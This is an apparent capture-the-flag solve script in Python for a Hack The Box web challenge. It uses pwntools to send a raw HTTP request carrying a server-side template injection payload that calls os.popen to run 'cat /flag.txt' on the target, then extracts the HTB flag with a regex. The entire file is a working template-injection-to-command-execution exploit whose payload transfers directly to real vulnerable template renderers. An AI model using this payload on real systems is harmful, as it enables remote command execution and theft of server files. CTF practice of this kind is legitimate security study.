#!/usr/bin/env python3
import re
from pwn import remote

def fetch_flag(host: str, port: int) -> str:
    # build the raw HTTP GET payload
    req = (
        "GET /?text=${self.module.cache.util.os.popen('cat+/flag.txt').read()} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: close\r\n\r\n"
    )

    # connect and send
    conn = remote(host, port)
    conn.send(req)
    response = conn.recvall(timeout=2)
    conn.close()

    # decode and search for HTB flag
    text = response.decode(errors="ignore")
    m = re.search(r"(HTB\{.*?\})", text)
    return m.group(1) if m else "Flag not found"

if __name__ == "__main__":
    host = input("Host (e.g. 127.0.0.1): ").strip()
    port = int(input("Port (e.g. 8080): ").strip())
    print(fetch_flag(host, port))

